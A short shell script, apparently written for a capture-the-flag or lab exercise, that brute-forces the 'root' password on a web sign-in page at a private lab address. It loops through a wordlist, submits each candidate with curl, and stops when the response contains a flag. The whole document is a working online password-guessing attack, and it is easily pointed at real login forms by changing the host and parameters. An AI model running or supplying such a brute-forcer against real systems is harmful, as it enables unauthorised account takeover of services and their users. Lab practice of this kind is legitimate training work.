#!/bin/sh
length=$(awk 'END{print NR}' file)
#echo $length
current=0
ip_address="10.30.237.180"
input="file"
while IFS= read -r line
do
    response=$(curl -s "http://$ip_address/?page=signin&username=root&password=$line&Login=Login" | grep "flag")
    if [ ! -z "$response" ]; then
        echo "found password is : $line"
        echo $response
        break
    fi
    current=$((current+1))
    echo "pw: $line || Current progress : $(((current * 100) / length))%\r"
done < "$input"